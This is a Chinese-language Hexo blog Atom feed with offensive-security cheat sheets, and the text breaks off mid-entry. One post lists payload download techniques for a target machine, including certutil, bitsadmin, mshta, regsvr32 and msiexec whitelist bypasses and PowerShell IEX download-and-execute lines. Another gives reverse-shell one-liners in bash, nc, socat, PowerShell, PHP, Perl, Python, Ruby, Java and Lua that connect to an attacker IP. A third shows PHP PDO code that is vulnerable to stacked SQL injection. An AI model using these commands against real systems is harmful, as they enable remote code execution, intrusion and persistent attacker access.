<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Twe1ve&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://github.com/Twe1ve-web/Twe1ve-web.github.io/"/>
  <updated>2020-04-19T13:32:58.437Z</updated>
  <id>https://github.com/Twe1ve-web/Twe1ve-web.github.io/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>multi-ways-file-download</title>
    <link href="https://github.com/Twe1ve-web/Twe1ve-web.github.io/2020/04/19/multi-ways-file-download/"/>
    <id>https://github.com/Twe1ve-web/Twe1ve-web.github.io/2020/04/19/multi-ways-file-download/</id>
    <published>2020-04-19T13:32:17.000Z</published>
    <updated>2020-04-19T13:32:58.437Z</updated>
    
    <content type="html"><![CDATA[<p><strong>这里我分为三个模块：Linux、Windows、常见语言环境</strong></p><p>#Linux#</p><h1 id="1、curl"><a href="#1、curl" class="headerlink" title="1、curl"></a>1、curl</h1><pre><code>curl -O http://xx.xx.xx.xx/filename curl http://xx.xx.xx.xx/filename  -o path/filename</code></pre><h1 id="2、wget"><a href="#2、wget" class="headerlink" title="2、wget"></a>2、wget</h1><pre><code>wget http://xx.xx.xx.xx/filename  [-o path/filename]</code></pre><h1 id="3、nc"><a href="#3、nc" class="headerlink" title="3、nc"></a>3、nc</h1><h2 id="3-1、发送方主动连接目标机器"><a href="#3-1、发送方主动连接目标机器" class="headerlink" title="3.1、发送方主动连接目标机器"></a>3.1、发送方主动连接目标机器</h2><p>接收方先执行命令</p><pre><code>发送方：nc -w 3 [destination] 1234 &lt; out.file接收方:nc -l -p 1234 &gt; out.file</code></pre><h2 id="3-2、目标机器主动连接发送方"><a href="#3-2、目标机器主动连接发送方" class="headerlink" title="3.2、目标机器主动连接发送方"></a>3.2、目标机器主动连接发送方</h2><pre><code>cat file | nc -l 1234   ###发送方将文件内容打印到本地1234端口，接收方访问1234端口接收文件nc  launcher_ip 1234 &gt; file  ####接收方</code></pre><h1 id="4、利用linux自带base64命令"><a href="#4、利用linux自带base64命令" class="headerlink" title="4、利用linux自带base64命令"></a>4、利用linux自带base64命令</h1><p>本地将(可执行)文件转换为base64</p><pre><code>python -c &apos;print(__import__(&quot;base64&quot;).b64encode(open(&quot;file&quot;, &quot;rb&quot;).read()))&apos;</code></pre><p>目标机器执行：</p><pre><code>echo &quot;strings&quot; | base64 -d &gt; out.file</code></pre><h1 id="5、SCP"><a href="#5、SCP" class="headerlink" title="5、SCP"></a>5、SCP</h1><pre><code>scp username@servername:/path/filename /tmp/local_destination</code></pre><p>当然，windows有ssh的也可以使用，只是Linux一般比较多</p><h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><h1 id="1、Powershell"><a href="#1、Powershell" class="headerlink" title="1、Powershell"></a>1、Powershell</h1><h2 id="1-1、IEX调用WebClient"><a href="#1-1、IEX调用WebClient" class="headerlink" title="1.1、IEX调用WebClient"></a>1.1、IEX调用WebClient</h2><p>[1]</p><pre><code>IEX(New-Object System.Net.WebClient).DownloadFile($url, $output)   ####下载</code></pre><p>[2]    </p><pre><code>powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;http://10.10.14.67:8000/PowerUp.ps1&apos;); Invoke-AllChecks&quot; ##加载PS1到内存并执行</code></pre><h2 id="1-2、WebRequest下载："><a href="#1-2、WebRequest下载：" class="headerlink" title="1.2、WebRequest下载："></a>1.2、WebRequest下载：</h2><pre><code>Invoke-WebRequest  （-Uri） http://10.10.14.67:8000/procdump.exe -outfile ./procdump.exe  ###cmd下前面加powershell</code></pre><h2 id="1-3、BitsTransfer"><a href="#1-3、BitsTransfer" class="headerlink" title="1.3、BitsTransfer"></a>1.3、BitsTransfer</h2><pre><code>Start-BitsTransfer -Source $url -Destination $output  ###cmd下前面加powershell</code></pre><h1 id="2、SMB"><a href="#2、SMB" class="headerlink" title="2、SMB"></a>2、SMB</h1><h2 id="2-1、powershell"><a href="#2-1、powershell" class="headerlink" title="2.1、powershell"></a>2.1、powershell</h2><pre><code>Copy-Item -Source \\10.10.101.222\share\xxx.exe -Destination C:\path\</code></pre><h2 id="2-2、CMD"><a href="#2-2、CMD" class="headerlink" title="2.2、CMD"></a>2.2、CMD</h2><pre><code>copy \\10.10.101.222\share\xxx.exe</code></pre><p>或者</p><pre><code>Robocopy : https://www.microsoft.com/en-us/download/details.aspx?id=17657</code></pre><h1 id="3、CURL"><a href="#3、CURL" class="headerlink" title="3、CURL"></a>3、CURL</h1><p>高版本windows自带</p><pre><code>curl -O  http://10.10.101.222:8000/xxx.execulr  http://10.10.101.222:8000/xxx.exe -o C:/tmp/xxx.exe </code></pre><h1 id="4、FTP"><a href="#4、FTP" class="headerlink" title="4、FTP"></a>4、FTP</h1><pre><code>echo open 10.10.101.222 21&gt; ftp.txtecho ftp&gt;&gt; ftp.txtecho bin &gt;&gt; ftp.txtecho ftp&gt;&gt; ftp.txtecho GET xxx.exe &gt;&gt; ftp.txtftp -s:ftp.txt</code></pre><p>或交互式shell情况下直接ftp登录到攻击机(开启ftp) get filename<br>（linux开启ftp同样适用）</p><h1 id="5、VBS"><a href="#5、VBS" class="headerlink" title="5、VBS"></a>5、VBS</h1><h2 id="5-1、-vbs文件内容"><a href="#5-1、-vbs文件内容" class="headerlink" title="5.1、.vbs文件内容"></a>5.1、.vbs文件内容</h2><pre><code>Set Post = CreateObject(&quot;Msxml2.XMLHTTP&quot;)Set Shell = CreateObject(&quot;Wscript.Shell&quot;)Post.Open &quot;GET&quot;,&quot;http://10.10.101.222:8000/xxx.exe&quot;,0Post.Send()Set aGet = CreateObject(&quot;ADODB.Stream&quot;)aGet.Mode = 3aGet.Type = 1aGet.Open()aGet.Write(Post.responseBody)aGet.SaveToFile &quot;C:\test\update\xxx.exe&quot;,2</code></pre><h2 id="5-2、CMD下执行"><a href="#5-2、CMD下执行" class="headerlink" title="5.2、CMD下执行"></a>5.2、CMD下执行</h2><pre><code>echo Set Post = CreateObject(&quot;Msxml2.XMLHTTP&quot;) &gt;&gt;download.vbsecho Set Shell = CreateObject(&quot;Wscript.Shell&quot;) &gt;&gt;download.vbsecho Post.Open &quot;GET&quot;,&quot;http://10.10.101.222:8000/xxx.exe&quot;,0 &gt;&gt;download.vbsecho Post.Send() &gt;&gt;download.vbsecho Set aGet = CreateObject(&quot;ADODB.Stream&quot;) &gt;&gt;download.vbsecho aGet.Mode = 3 &gt;&gt;download.vbsecho aGet.Type = 1 &gt;&gt;download.vbsecho aGet.Open() &gt;&gt;download.vbsecho aGet.Write(Post.responseBody) &gt;&gt;download.vbsecho aGet.SaveToFile &quot;C:\tmp\xxx.exe&quot;,2 &gt;&gt;download.vbs</code></pre><h2 id="5-3、wget-vbs"><a href="#5-3、wget-vbs" class="headerlink" title="5.3、wget.vbs"></a>5.3、wget.vbs</h2><pre><code>on error resume nextiLocal=LCase(Wscript.Arguments(1))iRemote=LCase(Wscript.Arguments(0))iUser=LCase(Wscript.Arguments(2))iPass=LCase(Wscript.Arguments(3))set xPost=CreateObject(&quot;Microsoft.XMLHTTP&quot;)if iUser=&quot;&quot; and iPass=&quot;&quot; thenxPost.Open &quot;GET&quot;,iRemote,0elsexPost.Open &quot;GET&quot;,iRemote,0,iUser,iPassend ifxPost.Send()set sGet=CreateObject(&quot;ADODB.Stream&quot;)sGet.Mode=3sGet.Type=1sGet.Open()sGet.Write xPost.ResponseBodysGet.SaveToFile iLocal,2</code></pre><p>cscript wget.vbs <a href="http://10.10.101.222:8000/xxx.exe" target="_blank" rel="noopener">http://10.10.101.222:8000/xxx.exe</a></p><h1 id="6、CSC-exe"><a href="#6、CSC-exe" class="headerlink" title="6、CSC.exe"></a>6、CSC.exe</h1><p>CSC.exe是windows自带的C#编译器<br>CSC.exe路径需要绝对路径，且路径根据.net版本而定<br>download.cs：（利用echo依次写入如下内容）</p><pre><code>using System.Net;namespace downloader{    class Program    {    static void Main(string[] args)    {        WebClient client = new WebClient();        string URLAddress = @&quot;http://10.10.101.222:8000/xxx.exe&quot;;        string receivePath = @&quot;C:\tmp\&quot;;        client.DownloadFile(URLAddress, receivePath + System.IO.Path.GetFileName(URLAddress));    } }}</code></pre><p>执行：<br>C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /out:C:\tmp\download.exe C:\tmp\download.cs</p><h1 id="7、记事本文件下载"><a href="#7、记事本文件下载" class="headerlink" title="7、记事本文件下载"></a>7、记事本文件下载</h1><p>notepad中:<br>打开–&gt;输入URL （win10 不支持？？？）</p><h1 id="8、JScript下载"><a href="#8、JScript下载" class="headerlink" title="8、JScript下载"></a>8、JScript下载</h1><p>.js文件内容</p><pre><code>var Object = WScript.CreateObject(&quot;MSXML2.XMLHTTP&quot;);Object.open(&quot;GET&quot;,&quot;http://10.10.101.222:8000/xxx.exe&quot;,false);Object.send();if (Object.Status == 200){   var Stream = WScript.CreateObject(&quot;ADODB.Stream&quot;);   Stream.Open();   Stream.Type = 1;   Stream.Write(Object.ResponseBody);   Stream.SaveToFile(&quot;C:\\tmp\\xxx.exe&quot;, 2);Stream.Close();}</code></pre><p>执行： node download.js<br>或<br>合并成一句话形式：也就是rundll32</p><pre><code>rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();Object=new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);Object.open(&quot;GET&quot;,&quot;http://10.10.101.222:8000/xxx.exe&quot;,false);Object.send();if(Object.Status==200){Stream=new ActiveXObject(&quot;ADODB.Stream&quot;);Stream.Open();Stream.Type=1;Stream.Write(Object.ResponseBody);Stream.SaveToFile(&quot;C:\\tmp\\xxx.exe&quot;,2);Stream.Close();}</code></pre><h1 id="9、bitsadmin"><a href="#9、bitsadmin" class="headerlink" title="9、bitsadmin"></a>9、bitsadmin</h1><p>不支持https,ftp协议，使用SimpleHttpServer会报错</p><pre><code>bitsadmin /transfer n http://10.10.101.222:8000\xxx.exe  C:\tmp\xxx.exe</code></pre><h1 id="10、Certutil"><a href="#10、Certutil" class="headerlink" title="10、Certutil"></a>10、Certutil</h1><pre><code>certutil.exe -urlcache -split -f http://10.10.101.222:8000/xxx.exe xxx.exe  ###下载文件certutil -urlcache -split -f http://10.10.101.222:8000/xxx.exe delete   ###删除缓存</code></pre><h1 id="11、msiexec-（远程执行）"><a href="#11、msiexec-（远程执行）" class="headerlink" title="11、msiexec  （远程执行）"></a>11、msiexec  （远程执行）</h1><p><a href="https://www.hackingarticles.in/bypass-application-whitelisting-using-msiexec-exe-multiple-methods/" target="_blank" rel="noopener" title="msiexec白名单bypass">https://www.hackingarticles.in/bypass-application-whitelisting-using-msiexec-exe-multiple-methods/</a></p><pre><code>msfvenom -p windows/exec CMD=cmd.exe -f msi &gt; evil.msimsiexec /q /i http://10.10.101.222:8000/evil.msi</code></pre><h1 id="12、IEExec"><a href="#12、IEExec" class="headerlink" title="12、IEExec"></a>12、IEExec</h1><pre><code>C:\Windows\Microsoft.NET\Framework\v2.0.50727&gt; caspol -s off   ####需管理员身份C:\Windows\Microsoft.NET\Framework\v2.0.50727&gt; IEExec http://10.10.101.222:8000/xxx.exe</code></pre><h1 id="13、mshta"><a href="#13、mshta" class="headerlink" title="13、mshta"></a>13、mshta</h1><pre><code>mshta http://10.10.101.222/run.hta</code></pre><p>run.hta</p><pre><code>&lt;HTML&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt; &lt;HEAD&gt; &lt;script language=&quot;VBScript&quot;&gt; Window.ReSizeTo 0, 0 Window.moveTo -2000,-2000 Set objShell = CreateObject(&quot;Wscript.Shell&quot;) objShell.Run &quot;cmd.exe /c net user&quot; // 这里填写命令 self.close &lt;/script&gt;     &lt;body&gt; demo &lt;/body&gt; &lt;/HEAD&gt;&lt;/HTML&gt;</code></pre><h1 id="14、rundll32"><a href="#14、rundll32" class="headerlink" title="14、rundll32"></a>14、rundll32</h1><pre><code>rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();Object=new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);Object.open(&quot;GET&quot;,&quot;http://10.10.101.222:8000/xxx.exe&quot;,false);Object.send();if(Object.Status==200){Stream=new ActiveXObject(&quot;ADODB.Stream&quot;);Stream.Open();Stream.Type=1;Stream.Write(Object.ResponseBody);Stream.SaveToFile(&quot;C:\\tmp\\xxx.exe&quot;,2);Stream.Close();}</code></pre><h1 id="15、regsvr32："><a href="#15、regsvr32：" class="headerlink" title="15、regsvr32："></a>15、regsvr32：</h1><p><a href="https://www.hackingarticles.in/bypass-application-whitelisting-using-regsrv32-exe-multiple-methods/" target="_blank" rel="noopener" title="regsvr32白名单bypass">https://www.hackingarticles.in/bypass-application-whitelisting-using-regsrv32-exe-multiple-methods/</a></p><pre><code>regsvr32 /u /s /i:http://10.10.101.222:8000/run.sct scrobj.dll</code></pre><p>run.sct:</p><pre><code>&lt;?XML version=&quot;1.0&quot;?&gt; &lt;scriptlet&gt; &lt;registration         progid=&quot;ShortJSRAT&quot;         classid=&quot;{10001111-0000-0000-0000-0000FEEDACDC}&quot; &gt;         &lt;!-- Learn from Casey Smith @subTee --&gt;         &lt;script language=&quot;JScript&quot;&gt;                 &lt;![CDATA[                         ps  = &quot;cmd.exe /c calc.exe&quot;;   ####命令执行                      new ActiveXObject(&quot;WScript.Shell&quot;).Run(ps,0,true);                     ]]&gt; &lt;/script&gt; &lt;/registration&gt;&lt;/scriptlet&gt;</code></pre><h1 id="常见编程环境下载"><a href="#常见编程环境下载" class="headerlink" title="常见编程环境下载"></a>常见编程环境下载</h1><h1 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h1><h2 id="1、命令行版本"><a href="#1、命令行版本" class="headerlink" title="1、命令行版本"></a>1、命令行版本</h2><pre><code>python -c &quot;import urllib2;u=urllib2.urlopen(&quot;http://xx.xxx.xx/filename&quot;);localfile=open(&apos;c:\tmp\filename&apos;,&apos;w&apos;);localfile.write(u.read());localfile.close();&quot;</code></pre><h2 id="2、脚本执行版本"><a href="#2、脚本执行版本" class="headerlink" title="2、脚本执行版本"></a>2、脚本执行版本</h2><pre><code>#!python#!/usr/bin/pythonimport urllib2u = urllib2.urlopen(&apos;http://domain/file&apos;)localFile = open(&apos;local_file&apos;, &apos;w&apos;)    localFile.write(u.read())localFile.close()</code></pre><p>kali@kali:~# python test.py</p><h2 id="3、通过python脚本构造任意文件上传页面："><a href="#3、通过python脚本构造任意文件上传页面：" class="headerlink" title="3、通过python脚本构造任意文件上传页面："></a>3、通过python脚本构造任意文件上传页面：</h2><p> <a href="https://0day.work/finding-an-arbitrary-file-upload-vulnerability-in-a-filesharing-script/" target="_blank" rel="noopener" title="SimpleHTTPServer文件上传版本">https://0day.work/finding-an-arbitrary-file-upload-vulnerability-in-a-filesharing-script/</a></p><h1 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h1><h2 id="1、命令行版本-1"><a href="#1、命令行版本-1" class="headerlink" title="1、命令行版本"></a>1、命令行版本</h2><pre><code>perl -MLWP::Simple -e &apos;getstore (&quot;http://xx.xx.xx.xx/filename&quot;,&quot;filename&quot;)&apos;</code></pre><p>2、脚本执行</p><pre><code>#!/usr/bin/perluse LWP::Simple;getstore(&quot;http://domain/file&quot;, &quot;file&quot;);</code></pre><p>kali@kali:~# perl test.pl</p><h1 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h1><pre><code>#!ruby#!/usr/bin/rubyrequire &apos;net/http&apos;Net::HTTP.start(&quot;www.domain.com&quot;) { |http|r = http.get(&quot;/file&quot;)open(&quot;save_location&quot;, &quot;wb&quot;) { |file|file.write(r.body)}}</code></pre><p>kali@kali:~# ruby test.rb</p><h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><p>1、命令行</p><pre><code>php -r &apos;$data = @file(&quot;http://10.10.14.67:8000/winPEAS.exe&quot;);$f = fopen(&quot;/tmp/winPEAS.exe&quot;, &quot;w&quot;);fwrite($f, $data[0]);fclose($f);&apos;</code></pre><p>2、脚本执行</p><pre><code>&lt;?php $data = @file(&quot;http://10.10.14.67:8000/winPEAS.exe&quot;);$f = fopen(&quot;/tmp/winPEAS.exe&quot;, &quot;w&quot;);fwrite($f, $data[0]);fclose($f);?&gt;</code></pre><p>kali@kali:~# php test.php</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;这里我分为三个模块：Linux、Windows、常见语言环境&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;#Linux#&lt;/p&gt;
&lt;h1 id=&quot;1、curl&quot;&gt;&lt;a href=&quot;#1、curl&quot; class=&quot;headerlink&quot; title=&quot;1、curl&quot;&gt;&lt;/
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Rerverse_shell&amp;Interactive_shell</title>
    <link href="https://github.com/Twe1ve-web/Twe1ve-web.github.io/2020/04/19/Rerverse-shell-Interactive-shell/"/>
    <id>https://github.com/Twe1ve-web/Twe1ve-web.github.io/2020/04/19/Rerverse-shell-Interactive-shell/</id>
    <published>2020-04-19T12:38:26.000Z</published>
    <updated>2020-04-19T12:39:09.332Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1、NC"><a href="#1、NC" class="headerlink" title="1、NC"></a>1、NC</h1><h2 id="1-1、NC-reverse-shell"><a href="#1-1、NC-reverse-shell" class="headerlink" title="1.1、NC reverse shell"></a>1.1、NC reverse shell</h2><p>1.1.1、-e参数（目标机器上执行）</p><pre><code>nc  《attack_ip》 《attack_port》 -e /bin/bash  </code></pre><p>1.1.2、没有-e参数（目标机器上执行）</p><pre><code>[1]/bin/sh | nc 《attack_ip》 《attack_port》[2] rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 《attack_ip》 《attack_port》 &gt; /tmp/f   ###OpenBsd[3]nc -c bash 《attack_ip》 《attack_port》</code></pre><p>nc -lvvp attack_port  ###攻击机上执行</p><h2 id="1-2、NC-Bind-shell"><a href="#1-2、NC-Bind-shell" class="headerlink" title="1.2、NC Bind shell"></a>1.2、NC Bind shell</h2><pre><code>nc -lvvp 4444 -e /bin/bash  ###目标机器上执行nc victim_ip 4444    ###攻击机器执行</code></pre><h1 id="2-BASH"><a href="#2-BASH" class="headerlink" title="2.BASH"></a>2.BASH</h1><h2 id="2-1、bash-tcp"><a href="#2-1、bash-tcp" class="headerlink" title="2.1、bash tcp"></a>2.1、bash tcp</h2><pre><code>bash -i&gt;＆/dev/tcp/《attack_ip》/《attack_port》 0&gt;＆1  ###目标机器上执行nc -lvvp attack_port   ###攻击机上执行</code></pre><h2 id="2-2、bash-udp"><a href="#2-2、bash-udp" class="headerlink" title="2.2、bash udp"></a>2.2、bash udp</h2><p>目标机器上执行：  </p><pre><code>bash -i &gt;&amp; /dev/udp/《attack_ip》/《attack_port》 0&gt;&amp;1  ###目标机器上执行nc -u -lvp 《aattack_port》  ####攻击机上执行</code></pre><p>同样可以尝试其他类型shell：sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, bash</p><h1 id="3、Socat"><a href="#3、Socat" class="headerlink" title="3、Socat"></a>3、Socat</h1><pre><code>socat file:`tty`,raw,echo=0 TCP-L:《attack_port》  ####攻击机上执行socat exec:&apos;bash -li&apos;,pty,stderr,setsid,sigint,sane tcp:《attack_ip》:《attack_port》 ###目标机器上执行</code></pre><p>有些机器没有socat，需下载到目标机器：<a href="https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat">https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat</a> </p><h1 id="4、Telnet"><a href="#4、Telnet" class="headerlink" title="4、Telnet"></a>4、Telnet</h1><p>目标机器：</p><pre><code>telnet 《attack_ip》80 | /bin/bash | telnet 192.168.2.6 443</code></pre><p>攻击机：</p><pre><code>nc -lv 80nc -lv 443</code></pre><h1 id="5、Powershell"><a href="#5、Powershell" class="headerlink" title="5、Powershell"></a>5、Powershell</h1><p>[1]</p><pre><code>powershell -nop -exec bypass -c &quot;$client = New-Object System.Net.Sockets.TCPClient(&apos;《attack_ip》&apos;,《attack_port》);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &apos;PS &apos; + (pwd).Path + &apos;&gt; &apos;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&quot;</code></pre><p>[2]Nishang : Invoke-PowerShellTcp.ps1</p><pre><code>powershell iex (New-Object Net.WebClient).DownloadString(&apos;http://&lt;yourwebserver&gt;/Invoke-PowerShellTcp.ps1&apos;);Invoke-PowerShellTcp -Reverse -IPAddress 《attack_ip》 -Port 《attack_port》</code></pre><h1 id="常见语言环境反弹shell"><a href="#常见语言环境反弹shell" class="headerlink" title="常见语言环境反弹shell"></a>常见语言环境反弹shell</h1><p>PHP</p><pre><code>[1]php -r &apos;$sock=fsockopen(&quot;《attack_ip》&quot;,《attack_port》);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;[2]php -r &apos;$sock=fsockopen(&quot;《attack_ip》&quot;,《attack_port》);$proc=proc_open(&quot;/bin/sh -i&quot;, array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock),$pipes);&apos;</code></pre><p>Perl</p><pre><code>perl -e &apos;use Socket;$i=&quot;《attack_ip》&quot;;$p=《attack_port》;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&apos;</code></pre><p>Python</p><pre><code>python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;《attack_ip》&quot;,《attack_port》));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)&apos;</code></pre><p>Ruby</p><pre><code>ruby -rsocket -e&apos;f=TCPSocket.open(&quot;《attack_ip》&quot;,《attack_port》).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&apos;</code></pre><p>JAVA</p><pre><code>r = Runtime.getRuntime() p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/《attack_ip》/《attack_port》;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[]) p.waitFor()</code></pre><p>Lua</p><pre><code>lua -e &quot;require(&apos;socket&apos;);require(&apos;os&apos;);t=socket.tcp();t:connect(&apos;《attack_ip》&apos;,&apos;《attack_port》&apos;);os.execute(&apos;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&apos;);&quot;</code></pre><p>###linux only</p><h1 id="交互式shell："><a href="#交互式shell：" class="headerlink" title="交互式shell："></a>交互式shell：</h1><h2 id="1-监听时使用rlwrap"><a href="#1-监听时使用rlwrap" class="headerlink" title="[1]监听时使用rlwrap"></a>[1]监听时使用rlwrap</h2><pre><code>rlwrap nc -lvvp 4444</code></pre><h2 id="2-使用socat"><a href="#2-使用socat" class="headerlink" title="[2]使用socat"></a>[2]使用socat</h2><pre><code>socat file:`tty`,raw,echo=0 tcp-listen:4444</code></pre><h2 id="3-Spawn-a-TTY-shell-from-an-interpreter"><a href="#3-Spawn-a-TTY-shell-from-an-interpreter" class="headerlink" title="[3]Spawn a TTY shell from an interpreter:"></a>[3]Spawn a TTY shell from an interpreter:</h2><p>/bin/sh -i<br>python -c ‘import pty; pty.spawn(“/bin/sh”)’<br>python3 -c ‘import pty; pty.spawn(“/bin/sh”)’<br>perl -e ‘exec “/bin/sh”;’</p><h2 id="4-升级为tty-shell"><a href="#4-升级为tty-shell" class="headerlink" title="[4]升级为tty shell"></a>[4]升级为tty shell</h2><p>ctrl+z<br>stty raw -echo<br>fg   ###这里输入不会显示，输入之后直接Enter即可</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;1、NC&quot;&gt;&lt;a href=&quot;#1、NC&quot; class=&quot;headerlink&quot; title=&quot;1、NC&quot;&gt;&lt;/a&gt;1、NC&lt;/h1&gt;&lt;h2 id=&quot;1-1、NC-reverse-shell&quot;&gt;&lt;a href=&quot;#1-1、NC-reverse-shell&quot; cla
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>PDO&amp;&amp;InjectionBypass</title>
    <link href="https://github.com/Twe1ve-web/Twe1ve-web.github.io/2020/02/21/PDO&amp;&amp;InjectionBypass/"/>
    <id>https://github.com/Twe1ve-web/Twe1ve-web.github.io/2020/02/21/PDO&amp;&amp;InjectionBypass/</id>
    <published>2020-02-21T11:34:45.899Z</published>
    <updated>2020-02-21T18:21:45.850Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PHP-PDO-amp-Injection-Bypass"><a href="#PHP-PDO-amp-Injection-Bypass" class="headerlink" title="PHP PDO &amp; Injection Bypass"></a><strong>PHP PDO &amp; Injection Bypass</strong></h1><p>PDO：PHP 数据对象<br>  PHP访问数据库定义了一个轻量级的一致接口。<br>  PDO 提供了一个数据访问抽象层，这意味着，不管使用哪种数据库，都可以用相同的函数（方法）来查询和获取数据。<br>  使用预处理和存储过程</p><p>PDO连接MySql数据库：</p><pre><code>&lt;?php$dbms=&apos;mysql&apos;; //数据库类型$host=&apos;127.0.0.1&apos;; //数据库主机名$port=&apos;3306&apos;;  //数据库端口$dbName=&apos;test&apos;;//使用的数据库$user=&apos;root&apos;;  //数据库连接用户名$pass=&apos;root&apos;;  //对应的密码$dsn=&quot;$dbms:host=$host;port=$port;dbname=$dbName&quot;;   try { $dbh = new PDO($dsn, $user, $pass); //初始化一个PDO对象 echo &quot;连接成功&lt;br/&gt;&quot;;/*你还可以进行一次搜索操作foreach ($dbh-&gt;query(&apos;SELECT * from FOO&apos;) as $row) {print_r($row); //你可以用 echo($GLOBAL); 来看到这些值}*/$dbh = null;} catch (PDOException $e) {die (&quot;Error!: &quot; . $e-&gt;getMessage() . &quot;&lt;br/&gt;&quot;);}//默认这个不是长连接，如果需要数据库长连接，需要最后加一个参数：array(PDO::ATTR_PERSISTENT =&gt; true) 变成这样：$db = new PDO($dsn, $user, $pass, array(PDO::ATTR_PERSISTENT =&gt; true));?&gt;</code></pre><p>PDO多语句安全问题：<br>使用PDO中query()函数同数据库交互：</p><pre><code>&lt;?php$dbms=&apos;mysql&apos;;$host=&apos;127.0.0.1&apos;;$dbName=&apos;test&apos;;$user=&apos;root&apos;;$pass=&apos;root&apos;;$dsn=&quot;$dbms:host=$host;dbname=$dbName&quot;;try { $pdo = new PDO($dsn, $user, $pass);} catch (PDOException $e) { echo $e;}$sql = &quot;select * from user where id=1;&quot;;$sql .= &quot;create table test2 like user&quot;;$stmt = $pdo-&gt;query($sql);while($row=$stmt-&gt;fetch(PDO::FETCH_ASSOC)){var_dump($row);echo &quot;&quot;;}</code></pre><p>PDO默认支持多语句查询，如果php版本小于5.5.21或者创建PDO实例时未设置PDO::MYSQL_ATTR_MULTI_STATEMENTS为false时可能会造成堆叠注入</p><pre><code>&lt;?php$dbms=&apos;mysql&apos;;$host=&apos;127.0.0.1&apos;;$dbName=&apos;test&apos;;$user=&apos;root&apos;;$pass=&apos;root&apos;;$dsn=&quot;$dbms:host=$host;dbname=$dbName&quot;;try { $pdo = new PDO($dsn, $user, $pass);} catch (PDOException $e) { echo $e;}$id = $_GET[&apos;id&apos;];$sql = &quot;SELECT * from user where id =&quot;.$id;$stmt = $pdo-&gt;query($sql);while($row=$stmt-&gt;fetch(PDO::FETCH_ASSOC)){var_dump($row);echo &quot;&quot;;}?&gt;</code></pre><p>$id变量可控，以形成堆叠注入</p><p><img src="./../../../../images/01.png" alt></p><p>禁止多语句执行：</p><pre><code>new PDO($dsn, $user, $pass, array( PDO::MYSQL_ATTR_MULTI_STATEMENTS =&gt; false))</code></pre><p>PDO预处理安全问题<br>    PDO分为模拟预处理和非模拟预处理。<br>    模拟预处理是防止某些数据库不支持预处理而设置的，在初始化PDO驱动时，可以设置一项参数,PDO::ATTR_EMULATE_PREPARES，作用是打开模拟预处理(true)或者关闭(false),默认为true。PDO内部会模拟参数绑定的过程，SQL语句是在最后execute()的时候才发送给数据库执行。<br>    非模拟预处理则是通过数据库服务器来进行预处理动作，主要分为两步：第一步是prepare阶段，发送SQL语句模板到数据库服务器；第二步通过execute()函数发送占位符参数给数据库服务器进行执行。</p><p>[1]模拟预处理动态拼接形成多语句执行（PHP&lt;5.3.6）</p><pre><code>&lt;?php$dbms=&apos;mysql&apos;;$host=&apos;127.0.0.1&apos;;$dbName=&apos;test&apos;;$user=&apos;root&apos;;$pass=&apos;root&apos;;$dsn=&quot;$dbms:host=$host;dbname=$dbName&quot;;try {$pdo = new PDO($dsn, $user, $pass);} catch (PDOException $e) {echo $e;}//$pdo-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES, false);$username = $_GET[&apos;username&apos;];$sql = &quot;select id,&quot;.$_GET[&apos;field&apos;].&quot; from user where username = ?&quot;;$stmt = 